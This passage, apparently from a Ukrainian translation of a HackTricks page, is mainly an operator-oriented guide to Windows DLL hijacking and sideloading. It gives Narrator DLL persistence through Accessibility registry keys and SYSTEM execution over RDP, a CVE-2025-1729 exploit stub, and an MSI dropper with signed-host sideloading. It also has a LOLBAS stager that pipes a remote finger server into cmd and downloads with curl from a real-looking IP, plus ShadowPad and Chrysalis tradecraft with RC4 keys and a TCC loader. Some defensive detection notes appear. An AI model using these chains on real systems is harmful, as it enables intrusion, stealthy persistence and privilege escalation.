- Запустіть Narrator і спостерігайте за спробою завантажити вказаний вище файл.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Тиша OPSEC
- Наївний hijack викликає озвучення/підсвічування UI. Щоб залишатися непомітним, під час attach перелічіть потоки Narrator, відкрийте основний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і призупиніть його через `SuspendThread`; продовжуйте роботу у власному потоці. Повний код див. у PoC.<sup>[[8]](#references)</sup>

Запуск і закріплення через конфігурацію Accessibility
- Контекст користувача (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Після цього запуск Narrator завантажує розміщену DLL. На захищеному робочому столі (екрані входу) натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на захищеному робочому столі.

Виконання SYSTEM через RDP (lateral movement)
- Дозвольте класичний рівень безпеки RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключіться до хоста через RDP і на екрані входу натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на захищеному робочому столі.
- Виконання припиняється після закриття сеансу RDP — оперативно виконайте inject/migrate.

Bring Your Own Accessibility (BYOA)
- Ви можете клонувати запис реєстру вбудованого Accessibility Tool (AT) (наприклад, CursorIndicator), змінити його так, щоб він указував на довільний бінарний файл/DLL, імпортувати його, а потім задати `configuration` як ім’я цього AT. Так можна запускати довільний код через фреймворк Accessibility.

Примітки
- Для запису в `%windir%\System32` і зміни значень HKLM потрібні права адміністратора.
- Уся логіка payload може міститися в `DLL_PROCESS_ATTACH`; експорти не потрібні.

## Практичний приклад: CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe

Цей приклад демонструє **Phantom DLL Hijacking** у Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), зареєстрованому як **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Деталі вразливості

- **Компонент**: `TPQMAssistant.exe`, розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Заплановане завдання**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 під контекстом користувача, який увійшов у систему.
- **Дозволи каталогу**: каталог доступний для запису `CREATOR OWNER`, що дозволяє локальним користувачам розміщувати довільні файли.
- **Поведінка пошуку DLL**: спочатку програма намагається завантажити `hostfxr.dll` із робочого каталогу та записує "NAME NOT FOUND", якщо файл відсутній, що свідчить про пріоритет пошуку в локальному каталозі.

### Реалізація експлойта

Зловмисник може розмістити шкідливу заглушку `hostfxr.dll` у тому самому каталозі й скористатися відсутністю DLL, щоб виконати код у контексті користувача:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Послідовність атаки

1. Як звичайний користувач, розмістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Дочекайтеся запуску запланованого завдання о 9:30 ранку в контексті поточного користувача.
3. Якщо під час виконання завдання в системі є адміністратор, шкідлива DLL запускається в сеансі адміністратора з рівнем цілісності Medium.
4. Застосуйте стандартні методи обходу UAC, щоб підвищити привілеї з рівня цілісності Medium до SYSTEM.

## Практичний приклад: дропер із CustomAction MSI + DLL Side-Loading через підписаний процес (wsc_proxy.exe)

Зловмисники часто поєднують дропери на основі MSI з DLL side-loading, щоб виконувати payload у довіреному процесі з цифровим підписом.<sup>[[10]](#references)</sup>

Огляд ланцюжка
- Користувач завантажує MSI. Під час інсталяції з графічним інтерфейсом CustomAction непомітно запускається (наприклад, LaunchApplication або дія VBScript) і відновлює наступний етап з вбудованих ресурсів.
- Дропер записує легітимний EXE з цифровим підписом і шкідливу DLL в один каталог (наприклад, пара Avast-signed wsc_proxy.exe + контрольована зловмисником wsc.dll).
- Після запуску підписаного EXE порядок пошуку DLL у Windows спочатку завантажує wsc.dll із робочого каталогу, виконуючи код зловмисника в процесі з цифровим підписом (ATT&CK T1574.001).

Аналіз MSI (на що звертати увагу)
- Таблиця CustomAction:
  - Шукайте записи, які запускають виконувані файли або VBScript. Приклад підозрілого шаблону: LaunchApplication запускає вбудований файл у фоновому режимі.
  - В Orca (Microsoft Orca.exe) перевірте таблиці CustomAction, InstallExecuteSequence і Binary.
- Вбудовані або розділені payload у CAB-файлі MSI:
  - Адміністративне вилучення: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Або скористайтеся lessmsi: lessmsi x package.msi C:\out
  - Шукайте кілька невеликих фрагментів, які об’єднуються та розшифровуються CustomAction на VBScript. Типовий ланцюжок:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading за допомогою wsc_proxy.exe
- Розмістіть ці два файли в одній теці:
  - wsc_proxy.exe: справжній підписаний host (Avast). Процес намагається завантажити wsc.dll за назвою з теки, у якій він міститься.
  - wsc.dll: DLL зловмисника. Якщо конкретні exports не потрібні, достатньо DllMain; інакше створіть proxy DLL і перенаправте потрібні exports до справжньої бібліотеки, запустивши payload у DllMain.
- Створіть мінімальний DLL payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Щоб виконати вимоги до експорту, скористайтеся фреймворком проксіювання (наприклад, DLLirant/Spartacus), щоб згенерувати forwarding DLL, яка також виконує ваш payload.

- Цей прийом використовує механізм визначення імен DLL хост-бінарником. Якщо хост використовує абсолютні шляхи або прапорці безпечного завантаження (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS і forwarded exports можуть впливати на пріоритетність, тому їх потрібно враховувати під час вибору хост-бінарника та набору експортів.

## Підписані тріади + зашифровані payload-и (розбір випадку ShadowPad)

Check Point описала, як Ink Dragon розгортає ShadowPad за допомогою **тріади з трьох файлів**, щоб маскуватися під легітимне програмне забезпечення й водночас зберігати основний payload зашифрованим на диску:<sup>[[12]](#references)</sup>

1. **Підписаний хост EXE** – зловживають програмами таких постачальників, як AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Зловмисники перейменовують виконуваний файл так, щоб він був схожий на бінарник Windows (наприклад, `conhost.exe`), але підпис Authenticode залишається чинним.
2. **Шкідлива loader DLL** – розміщується поруч із EXE під очікуваним ім’ям (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Зазвичай DLL — це бінарник MFC, обфускований за допомогою фреймворку ScatterBrain; її єдине завдання — знайти зашифрований blob, розшифрувати його та виконати reflective mapping ShadowPad.
3. **Зашифрований blob payload-а** – часто зберігається в тому самому каталозі як `<name>.tmp`. Після відображення розшифрованого payload-а в пам’ять loader видаляє TMP-файл, щоб знищити криміналістичні докази.

Примітки щодо tradecraft:

* Перейменування підписаного EXE зі збереженням початкового `OriginalFileName` у PE-заголовку дає змогу видавати його за бінарник Windows, зберігаючи підпис постачальника. Тож відтворіть звичку Ink Dragon розміщувати бінарники, схожі на `conhost.exe`, які насправді є утилітами AMD/NVIDIA.
* Оскільки виконуваний файл залишається довіреним, для більшості засобів контролю allowlisting достатньо, щоб ваша шкідлива DLL лежала поруч із ним. Зосередьтеся на налаштуванні loader DLL; зазвичай підписаний батьківський процес можна запускати без змін.
* Для роботи ShadowPad decryptor очікує, що TMP blob буде поруч із loader і матиме дозвіл на запис, щоб після відображення в пам’ять він міг обнулити файл. Залиште каталог доступним для запису, доки payload не завантажиться; після завантаження в пам’ять TMP-файл можна безпечно видалити з міркувань OPSEC.

### Ланцюжок LOLBAS stager + sideloading архіву з етапами (finger → tar/curl → WMI)

Оператори поєднують DLL sideloading із LOLBAS, щоб єдиним власним артефактом на диску була шкідлива DLL поруч із довіреним EXE:<sup>[[1]](#references)</sup>

- **Завантажувач віддалених команд (Finger):** прихований PowerShell запускає `cmd.exe /c`, отримує команди із сервера Finger і передає їх у `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` отримує текст через TCP/79; `| cmd` виконує відповідь сервера, даючи операторам змогу змінювати другий етап на сервері.

- **Вбудоване завантаження/розпакування:** Завантажте архів із нешкідливим розширенням, розпакуйте його та розмістіть цільовий файл для sideloading разом із DLL у випадковій папці `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` приховує індикатор виконання та переходить за перенаправленнями; `tar -xf` використовує вбудований у Windows tar.

- **Запуск через WMI/CIM:** Запустіть EXE через WMI, щоб у телеметрії відображався процес, створений через CIM, під час завантаження DLL у тому самому каталозі:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Працює з бінарними файлами, які надають перевагу локальним DLL (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) запускається під довіреною назвою.

- **Пошук:** створюйте сповіщення про `forfiles`, якщо одночасно використовуються `/p`, `/m` і `/c`; така комбінація рідко трапляється поза адміністративними скриптами.


## Приклад: NSIS-дропер + sideload через Bitdefender Submission Wizard (Chrysalis)

Під час нещодавнього вторгнення Lotus Blossom зловмисники скористалися довіреним ланцюжком оновлення, щоб доставити запакований NSIS-дропер, який розмістив DLL для sideload і payloads, що повністю виконувалися в пам’яті.<sup>[[13]](#references)</sup>

Послідовність дій
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає каталог як **HIDDEN**, розміщує в ньому перейменований `BluetoothService.exe` від Bitdefender Submission Wizard, шкідливий `log.dll` і зашифрований blob `BluetoothService`, а потім запускає EXE.
- Host EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` завантажує blob через mmap; `LogWrite` розшифровує його за допомогою потокового шифру на основі LCG (константи **0x19660D** / **0x3C6EF35F**, матеріал ключа отримано з попереднього хешу), перезаписує буфер відкритим shellcode, звільняє тимчасові дані та передає йому керування.
- Щоб уникнути IAT, loader знаходить API, хешуючи назви export-функцій за допомогою **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, а потім застосовує avalanche-перетворення у стилі Murmur (**0x85EBCA6B**) і порівнює результат із цільовими хешами з salt.

Основний shellcode (Chrysalis)
- Розшифровує основний модуль, схожий на PE, повторюючи операції add/XOR/sub із ключем `gQ2JR&9;` у п’ять проходів, а потім динамічно завантажує `Kernel32.dll` → `GetProcAddress`, щоб завершити розв’язання імпортів.
- Відновлює рядки з назвами DLL під час виконання за допомогою побайтових перетворень bit-rotate/XOR, а потім завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий resolver, який обходить **PEB → InMemoryOrderModuleList**, розбирає таблицю export-функцій блоками по 4 байти із застосуванням змішування у стилі Murmur і звертається до `GetProcAddress`, лише якщо хеш не знайдено.

Вбудована конфігурація та C2
- Конфігурація міститься у скинутому файлі `BluetoothService` за **зміщенням 0x30808** (розмір **0x980**) і розшифровується за допомогою RC4 з ключем `qwhvb^435h&*7`, що відкриває URL C2 і User-Agent.
- Beacons формують профіль хоста з компонентів, розділених крапками, додають на початок тег `4Q`, а потім шифрують його RC4 із ключем `vAuig34%^325hGV` перед викликом `HttpSendRequestA` через HTTPS. Відповіді розшифровуються RC4 і обробляються перемикачем тегів (`4T` shell, `4V` виконання процесу, `4W/4X` запис файлу, `4Y` читання/exfil, `4\\` видалення, `4` перелік дисків/файлів і випадки передавання частинами).
- Режим виконання визначається аргументами CLI: без аргументів — встановлює persistence (service/Run key), що вказує на `-i`; `-i` повторно запускає себе з `-k`; `-k` пропускає встановлення та запускає payload.

Виявлений альтернативний loader
- Під час того самого вторгнення зловмисники розмістили Tiny C Compiler і запустили `svchost.exe -nostdlib -run conf.c` із `C:\ProgramData\USOShared\`, а поруч — `libtcc.dll`. Наданий зловмисниками вихідний код C містив shellcode, який компілювався та виконувався в пам’яті без запису PE на диск. Відтворіть це так:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Цей етап компіляції та запуску на основі TCC імпортував `Wininet.dll` під час виконання й завантажував shellcode другого етапу з URL, жорстко заданого в коді, забезпечуючи гнучкий завантажувач, що маскується під запуск компілятора.

## Signed-host sideloading з export proxying + host thread parking

Деякі ланцюжки DLL sideloading додають **засоби підвищення стабільності**, щоб легітимний host залишався активним достатньо довго для коректного завантаження наступних етапів, а не аварійно завершувався після завантаження шкідливої DLL.<sup>[[11]](#references)</sup>

Спостережувана схема
- Розмістити довірений EXE поруч зі шкідливою DLL, використовуючи очікуване ім’я залежності, наприклад `version.dll`.
- Шкідлива DLL **проксіює всі очікувані експорти** до справжньої системної DLL (наприклад, `%SystemRoot%\\System32\\version.dll`), щоб розв’язання імпортів проходило успішно, а процес host продовжував працювати.
- Після завантаження шкідлива DLL **патчить точку входу host**, змушуючи основний потік зациклитися на `Sleep` замість завершення роботи або виконання коду, який зупинив би процес.
- Новий потік виконує власне шкідливе завдання: розшифровує ім’я або шлях DLL наступного етапу (часто використовуються RC4/XOR), а потім запускає її за допомогою `LoadLibrary`.

Чому це важливо
- Звичайне проксіювання DLL зберігає сумісність API, але не гарантує, що host працюватиме достатньо довго для наступних етапів.
- Призупинення основного потоку за допомогою `Sleep(INFINITE)` — простий спосіб залишити підписаний процес активним, поки завантажувач виконує розшифрування, підготовку наступного етапу або початкове налаштування мережевого з’єднання в робочому потоці.
- Пошук лише підозрілого `DllMain` може не виявити цю схему, якщо цікава поведінка починається після патчу точки входу host і запуску другого потоку.

Мінімальний робочий процес
1. Скопіювати підписаний EXE host і визначити, яку DLL він завантажує з локального каталогу.
2. Створити proxy DLL з таким самим набором експортованих функцій, що переспрямовують виклики до легітимної DLL.
3. У `DllMain(DLL_PROCESS_ATTACH)` створити робочий потік.
4. У цьому потоці пропатчити точку входу host або процедуру запуску основного потоку, щоб він зациклився на `Sleep`.
5. Розшифрувати ім’я/конфігурацію DLL наступного етапу й викликати `LoadLibrary` або вручну відобразити payload у пам’ять.

Напрями для захисного аналізу
- Підписані процеси, що завантажують `version.dll` або подібні поширені бібліотеки з каталогу власної програми замість `System32`.
- Патчі пам’яті в точці входу процесу невдовзі після завантаження образу, особливо переходи/виклики, перенаправлені до `Sleep`/`SleepEx`.
- Потоки, створені proxy DLL, які одразу викликають `LoadLibrary` для другої DLL із розшифрованим ім’ям.
- Proxy DLL із повним набором експортів, розміщені поруч із виконуваними файлами постачальника в доступних для запису тимчасових каталогах, як-от `ProgramData`, `%TEMP%` або каталоги з розпакованими архівами.

## References

- [1] [Red Canary – Аналітичні огляди розвідданих: січень 2026 року](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store — TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc — DLL hijacking у Windows. Простий приклад на C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research — Nimbus Manticore розгортає нове шкідливе ПЗ, націлене на Європу](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec — Hack-cessibility: коли DLL Hijacks зустрічаються з помічниками Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 — Цифрові двійники: анатомія кампаній із викраденням особистості, що розвиваються, і розповсюджують Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 — Збіжні інтереси: аналіз кластерів загроз, націлених на уряд Південно-Східної Азії](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research — Усередині Ink Dragon: розкриття ретрансляційної мережі та внутрішніх механізмів прихованої наступальної операції](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 — Бекдор Chrysalis: детальний аналіз інструментарію Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf — ланцюжок HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 — Відстеження шпигунських кампаній 2026 року іранської APT Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn — елемент `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn — елемент `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn — елемент `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn — елемент `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn — елемент `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn — елемент `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research — Швидко й рішуче: операції Nimbus Manticore під час іранського конфлікту](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn — дії завдань](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK — T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 — CL-STA-1062 націлюється на уряди та критичну інфраструктуру Південно-Східної Азії](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
